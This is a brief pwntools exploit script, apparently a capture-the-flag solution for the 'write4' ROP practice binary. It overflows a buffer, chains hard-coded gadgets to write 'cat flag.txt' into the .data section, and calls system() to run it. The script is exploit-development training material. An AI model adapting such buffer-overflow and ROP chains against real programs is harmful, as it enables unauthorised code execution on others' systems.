from pwn import *

pop2_gadget = 0x0000000000400890
pop1_gadget = 0x0000000000400893
mov_gadget = 0x0000000000400820
system_addr = 0x00000000004005e0
code = "cat flag.txt"

elf = ELF("write4")
data_section = elf.get_section_by_name(".data").header.sh_addr

# Payload
payload = "A" * 40

# First 4
payload += p64(pop2_gadget)
payload += p64(data_section)
payload += code[0:8]
payload += p64(mov_gadget)
# Next 4
payload += p64(pop2_gadget)
payload += p64(data_section + 8)
payload += code[8:] + "\x00"*4
payload += p64(mov_gadget)

# Call
payload += p64(pop1_gadget)
payload += p64(data_section)
payload += p64(system_addr)

io = elf.process()
io.sendline(payload)
io.interactive()